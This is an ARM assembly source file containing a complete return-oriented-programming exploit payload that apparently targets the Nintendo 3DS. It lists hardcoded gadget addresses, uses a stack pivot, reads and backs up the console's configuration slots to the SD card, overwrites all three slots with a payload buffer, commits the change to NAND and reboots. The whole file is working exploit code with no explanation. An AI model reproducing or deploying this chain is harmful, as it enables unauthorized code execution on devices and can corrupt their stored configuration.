.arm
.text
#define ENTRY 	0x0ffffe48    //-0x00681000   00681000-0ffffe48=F06811B8+0ffffe48
#define DEST	0x00682000
#define ROP 	DEST+0x4000
#define SLOTP	ROP+0x1000
#define SLOTS	ROP+0x2000
#define FILE 	0x00681100
#define PAYSIZE 0x00020200
#define MSET_DAT 0x00291022
#define SECOND 1000*1000*1000

#define ROP_POPPC 0x0011a1d4
#define POP_R0R2PC 0x00164654+1 //: pop {r0, r1, r2, pc}
#define POP_R0R3PC 0x0022c0e4+1 //: pop {r0, r1, r2, r3, pc}
#define POP_R0PC 0x00146760
#define POP_R1PC 0x001d53f8
#define POP_R2PC 0x00207d31
#define POP_R3PC 0x0010d44c
#define POP_R4PC 0x00120678 //: pop {r4, pc}
#define POP_R4R5PC 0x00109a4c //: pop {r4, r5, pc}
#define POP_R4R8PC 0x0010d20c
#define POP_R0R7PC 0x00260268+1 //: pop {r0, r1, r2, r3, r5, r6, r7, pc}
#define ROP_LDR_R0FROMR0 0x00131d98   // ldr r0, [r0] ; pop {r4, pc}
#define POP_R4LR_BXR2 0x00197898 //: pop {r4, lr} ; bx r2
#define ROP_POPR3_ADDSPR3_POPPC 0x0014660c + 4
#define STACK_PIVOT ROP_POPR3_ADDSPR3_POPPC
#define PIVOT_OFFSET -0x110
#define ROP_MOV_R3_R6_BLX_ADDRR5 0x001264AC
#define ROP_STR_R12R0  0x0010df64
#define ROP_STRB_R4R0 0x00243788 //: strb r4, [r0] ; pop {r4, pc}
#define ROP_MOV_R1_0 0x0019DFB4       			@; pop {r4, pc}
#define ROP_MOV_R3_4_JUNKTOR0 0x001317A4 @ LDMFD  	SP!, {R4-R8,PC}
#define ROP_MOV_R2_4_BLX_R3 0x00104bbc
#define ROP_MOVR3R0 0x0014b61c+1  // : movs r3, r0 ; lsrs r0, r0, #8 ; pop {r1, r4, r5, r7, pc}
#define BX_R0 0x00105d54 //: bx r0

#define svcSleepThread 0x001bdbd0
#define STR_YS 0x0028cb60
#define GARBAGE 0x44444444
#define NULL 0
#define GSPGPU_HANDLE 0x002993c4

#define _GSPGPU_WriteHWRegs 0x00136200      		//sp!,{ r4 pc }
#define GSPGPU_SetLcdForceBlack 0x001c13a4  		//sp!,{ r4-r6 pc }
#define MAGENTA 0x01ff00ff
#define RED 0x012020ff
#define GREEN 0x0100ff00
#define WHITE 0x01ffffff
#define HWREGS_ADDR 0x00202A04 

#define IFile_Read 0x001c3140 + 4
#define IFile_Write 0x001c73fc + 4
#define FS_MountSdmc 0x001a1654 + 4
#define IFile_Open 0x001c790c + 4

#define CFG_SetCfgInfoBlk 0x12bf88+4
#define CFG_GetCfgInfoBlk 0x12bf38+4
#define CFG_UpdateNandSave 0x12bfd4+4
#define slotID 0x00080000      // slot1, slot2 and 3 are slotID+1or2 respectively
#define NS_Reboot 0x00103e08
#define branch_setup 0x0020a318 //: cmp r1, r0 ; ldreq r0, [r5, #0x98] ; ldrne r0, [r5, #0x9c] ; str r0, [r5, #0xa0] ; pop {r4, r5, r6, pc}
//0x00135d70 : cmp r2, #0 ; strge r0, [r1] ; pop {r4, r5, r6, pc}
//#define ROP_LDMR1_R6R7 0x0025ec30+1 //: ldm r1!, {r6, r7} ; movs r7, r4 ; pop {r3, r7, pc} thumb
#define STM_R1_R5R6 0x00251ad4 //: stm r1, {r5, r6} ; pop {r4, r5, r6, pc}

#define rop_sleep(nanoseconds) .word POP_R0R2PC, nanoseconds, 0, ROP_POPPC, POP_R4LR_BXR2, GARBAGE, ROP_POPPC, svcSleepThread
#define rop_black(boolbyte) .word POP_R0PC, GSPGPU_HANDLE, GSPGPU_SetLcdForceBlack, GARBAGE, boolbyte, GARBAGE
#define rop_writeSlot(slotnum , data_buff) .word POP_R0R2PC, slotID+slotnum-1, data_buff, 0xC00, CFG_SetCfgInfoBlk, GARBAGE
#define rop_readSlot(slotnum , data_buff) .word POP_R0R2PC, data_buff, 0xC00, slotID+slotnum-1, CFG_GetCfgInfoBlk, GARBAGE
#define rop_updateConfigSave .word CFG_UpdateNandSave, GARBAGE
#define rop_color(coloraddr) .word POP_R0R3PC, GSPGPU_HANDLE, HWREGS_ADDR, coloraddr, 4, _GSPGPU_WriteHWRegs, GARBAGE, GARBAGE, GARBAGE 
#define sd_mount .word POP_R0PC, STR_YS, FS_MountSdmc, GARBAGE, GARBAGE, GARBAGE
#define fs_write(path, src_addr, size)  .word POP_R0R2PC, FILE, path, 6, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_R0R3PC, FILE, FILE+32, src_addr, size, IFile_Write, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
#define fs_read(path, dest_addr, size)  .word POP_R0R2PC, FILE, path, 1, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_R0R3PC, FILE, FILE+32, dest_addr, size, IFile_Read, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE

	.global	_start
@--------------------------------------------------------------------------------- ROP chain payload ( AM_TwlExport() )
_start:	
	rop_sleep(SECOND/2)
	rop_readSlot(1,SLOTS)
	
	.word POP_R0R7PC      //skips r4
		.word SLOTS+0x420
		.word 0x00680098
		.word GARBAGE
		.word GARBAGE
		.word read_restore-SP
		.word dump_install-SP
		.word GARBAGE
	.word STM_R1_R5R6
		.word GARBAGE
		.word 0x00680000
		.word GARBAGE
	.word ROP_LDR_R0FROMR0
		.word GARBAGE
	.word POP_R1PC
		.word 0x58584148  //HAXX magic
	.word branch_setup
		.word GARBAGE
		.word GARBAGE
		.word GARBAGE
	.word ROP_MOVR3R0
		.word GARBAGE
		.word GARBAGE
		.word GARBAGE
		.word GARBAGE
	.word STACK_PIVOT
SP:
		.word GARBAGE
		.word GARBAGE
		.word GARBAGE
	
read_restore:
	sd_mount
	fs_read(slots_path, SLOTS, 0x2400)
	rop_writeSlot(1,SLOTS)
	rop_writeSlot(2,SLOTS+0xC00)
	rop_writeSlot(3,SLOTS+0x1800)
	rop_updateConfigSave
	rop_color(green_addr)
	rop_sleep(0xffffffff)
	.word NS_Reboot

dump_install:
	rop_readSlot(2,SLOTS+0xC00)
	rop_readSlot(3,SLOTS+0x1800)
	sd_mount
	fs_write(slots_path,SLOTS,0x2400)
	rop_writeSlot(1,SLOTP)
	rop_writeSlot(2,SLOTP)
	rop_writeSlot(3,SLOTP)
	rop_updateConfigSave
	rop_color(red_addr)
	rop_sleep(0xffffffff)
	.word NS_Reboot
	
red_addr:
	.word RED
green_addr:
	.word GREEN
white_addr:	
	.word WHITE
slots_path:
	.string16 "YS:/slots.bin"

	
@--------------------------------------------------------------------------------- Notes

